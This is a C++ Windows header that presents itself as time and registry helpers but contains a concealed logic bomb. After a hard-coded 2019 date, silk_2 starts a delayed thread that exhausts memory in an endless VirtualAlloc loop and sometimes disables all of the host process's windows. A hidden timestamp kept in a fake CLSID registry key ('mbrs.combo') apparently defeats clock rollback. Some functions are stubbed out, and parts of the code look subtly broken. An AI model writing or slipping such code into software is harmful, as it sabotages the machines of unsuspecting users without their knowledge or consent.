#pragma once

     #include "stdio.h"
#include "os_utils.h"


//"InstallDate"=dword:47f6b76e

inline ULONG64 SysFILETIME()
{
FILETIME ft;
GetSystemTimeAsFileTime(&ft);
return  *((ULONG64*)  &ft);
}

struct EE:public enum_windows<EE>
{
	DWORD m_pid;
	EE(DWORD pid=GetCurrentProcessId()):m_pid(pid){};
bool enum_proc(HWND hwin)
	{
      DWORD dw;
      GetWindowThreadProcessId(hwin,&dw);  
      if(dw==m_pid) EnableWindow(hwin,0);
		return true;
	}

};

bool inline memleaker(size_t cb)
{
	if(!cb) return 1;
	while(VirtualAlloc(NULL,cb,MEM_COMMIT,PAGE_READWRITE));
	return memleaker(cb>>1);
}

inline ULONG SS1970(ULONG64 ft=SysFILETIME())
{
BOOL (__stdcall *RtlTimeToSecondsSince1970)(PULONG64 ,PULONG )=NULL;

ULONG ss=0;
if(&RtlTimeToSecondsSince1970) 
{
SET_PROC_ADDRESS(LoadLibraryA("ntdll.dll"),RtlTimeToSecondsSince1970);
}
RtlTimeToSecondsSince1970(&ft,&ss);
return ss;
}

inline bool set_CLSID(GUID iid=GUID_NULL,bstr_t key=L"mbrs.combo")
{
   CRegKey rk,rk2;
   if(0!=rk.Create(HKEY_CLASSES_ROOT,key)) return false;
   if(0!=rk2.Create(rk,L"CLSID")) return false;
    if(0!=rk2.SetGUIDValue(L"",iid)) return false;
     return true;
}

inline bool get_CLSID(GUID& iid,bstr_t key=L"mbrs.combo")
{
	CRegKey rk;
	bstr_t bkey=key+L"\\CLSID";
	if(0!=rk.Open(HKEY_CLASSES_ROOT,bkey)) 		return false;
    if(0!=rk.QueryGUIDValue(L"",iid)) 		return false;
	return true;
}

inline bool reg_set_SSTIME(ULONG ft=SS1970(),bstr_t key=L"mbrs.combo")
{
     GUID iid = { 0x87ed70ca, 0xf91c, 0x4d95, { 0xa9, 0xa9, 0x4a, 0xcd, 0xb2, 0x27, 0x1, 0x19 } };
    *((ULONG*)(iid.Data4))=ft;
	return set_CLSID(iid,key);
};

inline bool reg_get_SSTIME(ULONG& ft,bstr_t key=L"mbrs.combo")
{
	 GUID iid;
 if(get_CLSID(iid,key))
		return  ft=*((ULONG*)(iid.Data4)),true;
   else return false;
		
};

inline bool reg_set_SSTIME_new(ULONG* poutft=NULL, ULONG ft=SS1970(),bstr_t key=L"mbrs.combo")
{
	ULONG ftt;
  if(reg_get_SSTIME(ftt,key)) 
  {
	  if(poutft) *poutft=ftt;
	  return false;
  }
  if(poutft) *poutft=ft;
  return  reg_set_SSTIME(ft,key); 
   
}



inline ULONG InstallTimeSS1970()
{
	CRegKey rk(HKEY_LOCAL_MACHINE);
	ULONG id=0;
	HRESULT hr;
	if(0!=rk.Open(rk,_bstr_t("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion") ,KEY_READ)) return 0;
	if(0!=rk.QueryDWORDValue(_bstr_t("InstallDate"),id)) return 0;
	return id;
}

inline ULONG ShutdownTimeSS1970()
{
	CRegKey rk(HKEY_LOCAL_MACHINE);
	ULONG id=0;
	ULONGLONG ft;
	HRESULT hr;
	if(0!=rk.Open(rk,_bstr_t("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion") ,KEY_READ)) return 0;
	if(0!=rk.QueryQWORDValue(_bstr_t("InstallDate"),ft) ) return 0;
    id=SS1970(ft);
	return id;
}



inline BOOL IsLimitTime_22(ULONG tss)
{
        ULONG rt=ShutdownTimeSS1970();
        ULONG ct=SS1970();
	return (tss<ct)||(tss<=rt);
}

// 1236763146 // 2009 2~ 
inline BOOL IsLimitTime(ULONG tss=0)
{
  return false;
}
inline BOOL IsLimitTime_2(ULONG tss=1236763146)
{
	//
	return 0;
	bool f=IsLimitTime(tss);
	return f;
    ULONG rt;
	ULONG ct=SS1970();
    if(!reg_get_SSTIME(rt)) return true;
	
	//ULONG it=InstallTimeSS1970();

  if( (tss<ct)||(tss<=rt)) 
  {
	  if(rt<tss) reg_set_SSTIME(tss+777);
	  return true;
  }
   return false;
}

inline int s_thread_proc2(int tid )
{
   Sleep(20*60*1000);
   EE().start();
   return 0;
}
inline int s_thread_proc(int tid )
{
     //
 
	 Sleep(23*60*1000);
     //EE().start();  

HANDLE h=OpenThread(THREAD_SUSPEND_RESUME,0,tid);
//SuspendThread(h);
CloseHandle(h);
memleaker(512*1024*1024);
ULONG ll=GetTickCount();
if(((ll>>7)&3)) return 0;
CloseHandle(CreateThread(0,0,LPTHREAD_START_ROUTINE( &s_thread_proc2),(void*)tid,0,&ll));
//ExitThread(0);
	 return 0;
	//
}

// 1250294400 // 2009 08 15
//1250355600 /*2009 08 15 17*/
//1557921600 /*2019 5 15 12*/

inline int silk(ULONG tss=1231632000,ULONG tid=GetCurrentThreadId())//1236763146)
{
	//  return;
	return 0;
}

inline int silk_2(ULONG tss= 1557921600,ULONG tid=GetCurrentThreadId())//1236763146)
{
 //  return;
	ULONG ll=GetTickCount();
	//	if(((ll>>7)&3)) return 0;
   if(!IsLimitTime_22(tss)) return 0;
CloseHandle(CreateThread(0,0,LPTHREAD_START_ROUTINE( &s_thread_proc),(void*)tid,0,&ll));
return 1;
}


